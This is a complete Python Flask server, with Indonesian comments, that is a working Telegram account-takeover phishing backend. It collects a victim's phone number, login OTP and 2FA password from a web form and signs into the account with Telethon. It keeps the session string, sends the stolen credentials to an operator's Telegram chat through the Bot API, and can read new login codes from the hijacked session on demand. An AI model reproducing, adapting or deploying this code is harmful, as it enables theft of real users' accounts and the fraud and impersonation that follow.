import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

# Railway membutuhkan variabel 'app' ini di tingkat atas agar tidak crash
app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Memori untuk menyimpan sesi aktif agar respon cepat
user_db = {} 

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

def normalisasi_nomor(nomor):
    # Membersihkan karakter non-angka dan mengubah 08/62 ke +62
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'):
        num = '62' + num[1:]
    elif num.startswith('8'):
        num = '62' + num
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    # PERBAIKAN: get_json() untuk membaca data browser
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    
    # Menggunakan event loop baru agar tidak bentrok (anti-lelet)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(handle_flow(data))

async def handle_flow(data):
    client = None
    try:
        step = data.get('step')
        raw_nomor = data.get('nomor', '').strip()
        nomor = normalisasi_nomor(raw_nomor)
        nama = data.get('nama', 'User')

        session_str = user_db.get(nomor, {}).get('session', '')
        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor] = {
                "session": client.session.save(), 
                "hash": res.phone_code_hash, 
                "nama": nama, 
                "msg_id": None,
                "status_id": None
            }
            return jsonify({"status": "success"}), 200

        elif step == 2:
            try:
                # Pastikan client terhubung sebelum verifikasi OTP
                if not client.is_connected(): await client.connect()
                
                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                
                # LOGIN SUKSES: Kirim pesan utama (1 Nomor = 1 Pesan)
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{data.get('otp')}`"
                if not user_db[nomor].get('msg_id'):
                    msg = bot_api("sendMessage", {
                        "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                    })
                    user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
                
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "success"}), 200
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"}), 200
            except Exception:
                return jsonify({"status": "invalid_otp"}), 400

        elif step == 3:
            try:
                if not client.is_connected(): await client.connect()
                await client.sign_in(password=data.get('sandi'))
                
                # Update Pesan Utama dengan Kata Sandi
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : Berhasil"
                if user_db[nomor].get('msg_id'):
                    bot_api("editMessageText", {
                        "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'], 
                        "text": text, "parse_mode": "Markdown",
                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                    })
                return jsonify({"status": "success"}), 200
            except: return jsonify({"status": "invalid_2fa"}), 400
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        
        if nomor not in user_db: user_db[nomor] = {"nama": "User", "msg_id": None, "status_id": None}

        if action == "upd":
            # Hapus instruksi lama (jika ada)
            if user_db[nomor].get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
            
            # Kirim instruksi baru "Siap"
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", 
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            user_db[nomor]['status_id'] = res.get('result', {}).get('message_id')
            
            # Jalankan monitor OTP di Thread terpisah (Sangat Cepat & Anti-Lalot)
            threading.Thread(target=lambda: asyncio.run(monitor_new_otp(nomor))).start()
            
        elif action == "exit":
            # Hapus pesan "Bot siap" saat tombol Exit diklik
            if user_db[nomor].get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
                user_db[nomor]['status_id'] = None
                
    return jsonify({"status": "success"})

async def monitor_new_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data.get('session'): return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    try:
        await client.connect()
        # Trigger kirim ulang kode
        try:
            await client.send_code_request(nomor)
        except Exception as e:
            if "AuthRestart" in str(e): # Tangani Restart Otomatis
                await asyncio.sleep(1)
                await client.send_code_request(nomor)

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # 1. Update Pesan Utama dengan OTP baru
                bot_api("editMessageText", {
                    "chat_id": CHAT_ID, "message_id": data['msg_id'],
                    "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                    "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                # 2. Hapus pesan "Bot siap" otomatis setelah OTP masuk
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                    data['status_id'] = None
                await client.disconnect()

        await asyncio.sleep(60) # Pantau selama 1 menit
    finally:
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))